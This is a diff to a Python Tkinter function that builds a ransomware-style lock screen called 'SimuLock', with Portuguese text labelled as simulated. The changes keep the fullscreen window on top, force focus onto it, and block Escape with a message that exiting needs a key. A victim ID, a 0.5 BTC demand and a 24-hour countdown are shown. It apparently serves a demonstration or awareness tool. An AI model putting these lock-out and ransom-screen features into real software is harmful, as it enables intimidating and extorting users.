@@ -6,18 +6,20 @@ def mostrar_ransom_gui(on_submit):
     root.title("SYSTEM LOCKED")
     root.configure(bg="black")
     root.attributes("-fullscreen", True)
+    root.attributes("-topmost", True)
+    root.focus_force()
 
     victim_id = str(uuid.uuid4())[:8]
 
     frame = tk.Frame(root, bg="black")
-    frame.pack(expand=True)
+    frame.pack(expand=True, pady=20)
 
     titulo_app = tk.Label(
         frame,
-        text="☢︎ SimuLock v1.0",
+        text="☣[SimuLock v1.0]☣︎",
         fg="white",
         bg="black",
-        font=("Courier", 23, "bold")
+        font=("Courier", 22, "bold"),
     )
 
     titulo_msg = tk.Label(
@@ -35,18 +37,18 @@ def mostrar_ransom_gui(on_submit):
         frame,
         text=f"ID DA VÍTIMA: {victim_id}\n\n"
              "Todos os seus arquivos foram bloqueados.\n"
-             "Envie 10 BTC (SIMULADO)\n\n"
+             "Envie 0.5 BTC (SIMULADO)\n\n"
              "Tempo restante para perda permanente:",
         fg="white",
         bg="black",
-        font=("Courier", 14)
+        font=("Courier", 14), 
     )
     info.pack(pady=10)
 
-    # ⏱️ TIMER
+    # TIMER
     tempo_label = tk.Label(
         frame,
-        text="01:00",
+        text="24:00:00",
         fg="red",
         bg="black",
         font=("Courier", 32, "bold")
@@ -76,9 +78,11 @@ def mostrar_ransom_gui(on_submit):
         frame,
         font=("Courier", 16),
         width=30,
-        justify="center"
+        justify="center",
+        show="*"
     )
     entry.pack(pady=10)
+    root.after(100, lambda: entry.focus_set())
 
     result_label = tk.Label(
         frame,
@@ -88,16 +92,50 @@ def mostrar_ransom_gui(on_submit):
         font=("Courier", 12)
     )
     result_label.pack(pady=10)
+    entry.focus()
+
+    def toggle_password():
+        if entry.cget("show") == "":
+            entry.config(show="*")
+        else:
+            entry.config(show="")
+
+    btn_toggle = tk.Button(
+        frame,
+        text="MOSTRAR/OCULTAR CHAVE",
+        command=toggle_password,
+        bg="black",
+        fg="white"
+    )
+    btn_toggle.pack(pady=5)
 
     def submit():
-        key = entry.get()
+        if botao["state"] == "disabled":
+            return
+
+        botao.config(state="disabled")
+        key = entry.get().strip()
         ok = on_submit(key)
 
         if ok:
             result_label.config(text="✔︎ Arquivos restaurados", fg="green")
             root.after(2000, root.destroy)
         else:
-            result_label.config(text="✖︎ Chave inválida", fg="red")
+            result_label.config(
+                text="✖︎ Chave inválida — tente novamente",
+                fg="red"
+            )
+            entry.delete(0, tk.END)
+            botao.config(state="normal")
+
+    def sair():
+        result_label.config(
+            text="✖︎ Não é possível sair sem a chave",
+            fg="red"
+        )
+
+    entry.bind("<Return>", lambda e: submit())
+    root.bind_all("<Escape>", lambda e: sair())
 
     botao = tk.Button(
         frame,
